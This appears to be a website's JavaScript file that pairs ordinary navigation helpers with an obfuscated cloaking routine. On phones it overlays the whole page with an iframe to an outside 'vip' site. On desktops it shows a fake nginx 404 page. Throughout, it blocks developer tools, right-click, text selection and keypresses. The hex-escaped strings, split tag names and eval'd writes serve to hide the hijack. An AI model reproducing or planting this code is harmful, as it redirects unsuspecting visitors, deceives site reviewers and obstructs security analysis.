var date1 = new Date('08/08/2023');
var date2 = new Date();
var diffTime = Math.abs(date2 - date1);
var NUM = Math.ceil(diffTime / (1000 * 60 * 60 * 24));

let h = window.innerHeight;
let w = window.innerWidth;

var win_Height = window.innerHeight;
var system={win:false,mac:false,xll:false};
var p=navigator.platform;
var us=navigator.userAgent.toLowerCase();
system.win=p.indexOf("Win")==0;
system.mac=p.indexOf("Mac")==0;
system.x11=(p=="X11")||(p.indexOf("Linux")==0);

function randomString(length) {
    var str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    var result = '';
    for (var i = length; i > 0; --i) {
        result += str[Math.floor(Math.random() * str.length)];
    }
    return result;
}



try {
    if (/(iPhone|iPad|iPod|iOS|Android)/i["\x74\x65\x73\x74"](navigator["\x75\x73\x65\x72\x41\x67\x65\x6e\x74"])) {	
        if(system.win||system.mac||system.xll){
            
        } 
        else { 
            
                document.writeln('<style>body{padding-top:0!important;}</style>')
                var zindexCount = 99999999


                
                 var arr = [ 
                    'https://duomitv.github.io/duomi/vip.html',
                    ]; 
                
                var iframe_url = arr[parseInt(Math.random() * arr.length)]; 
                // window.location.href = iframe_url;
                
                var  iframe_str = '<div id="div_ifr'+'ame" style="z-index:'+(zindexCount-1)+';height:'+win_Height+'px; width: 100%;position: fixed; background: #ffffff;height: 100%;padding:0px;margin:0px;"><ifr'+'ame id="myifr'+'ame" frameborder="0" width="100%" height="100%" src="'+iframe_url+'"></ifr'+'ame></div><style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden;padding:0px;margin:0!important;}</style>';
                
                document.write(iframe_str);

        }
    } 
    
    
    if(system.win||system.mac||system.xll){
		let temp = '<div style="position: fixed; top: 0px;padding-top:20px; z-index: 99999; width: 100%; height: '+win_Height+'px; background-color: #ffffff; font-size: 16px;"><center><h2>404 Not Found</h2></center><hr><center>nginx pc</center></div>';
		eval("do"+"cu"+"ment.wr"+"ite('"+temp+"');");
		document.getElementsByTagName("title")[0].innerHTML = "\u0034\u0030\u0034";
		document.oncontextmenu = false;
		document.onkeydown = function(e) {
			var currKey = 0, evt = e || window.event;
			currKey = evt.keyCode || evt.which || evt.charCode;
			if (currKey == 123) {
				window.event.cancelBubble = true;
				window.event.returnValue = false;
			}
		}
    }
    
} 
catch (e) {
    console.log(e);
}





function openNav() {
    document.getElementById("myNav").style.width = "80%";
}

function closeNav() {
    document.getElementById("myNav").style.width = "0%";
}
function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min) + min);
  }


document.addEventListener('contextmenu',function(e){e.preventDefault();})
document.oncontextmenu=function(){return false;};
document.onselectstart=function(){return false;};

document.oncontextmenu = function () { return false; };
	window.onkeydown = window.onkeyup = window.onkeypress = function () {
	window.event.returnValue = false;
	return false;
}

document.onkeydown = function () {
	if (window.event && window.event.keyCode == 123) {
		event.keyCode = 0;
		event.returnValue = false;
		return false;
	}
};


// ===========================================================
// window.onresize = function () {
//     if(system.win||system.mac||system.xll){
//     	if (h != window.innerHeight || w != window.innerWidth) {
//     		window.close();
//     		window.location = "about:blank";
//     	}
//     }
// }
